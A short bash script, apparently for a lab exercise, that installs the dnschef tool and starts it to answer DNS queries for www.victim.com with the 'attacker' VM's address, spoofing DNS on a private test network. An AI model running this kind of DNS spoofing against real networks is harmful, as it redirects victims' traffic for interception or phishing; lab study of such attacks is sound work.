#!/bin/bash

IP_VM_ATTACKER="192.168.179.4"
IP_VM_VICTIM="192.168.179.3"

sudo apt-get update
sudo apt-get -y install python3-pip
sudo pip3 install dnslib

# installing the dnschef tool
git clone https://github.com/iphelix/dnschef.git
cd dnschef

# starting dnschef
echo "Starting dnschef"
sudo python3 dnschef.py --fakeip $IP_VM_ATTACKER --fakedomains www.victim.com --interface $IP_VM_VICTIM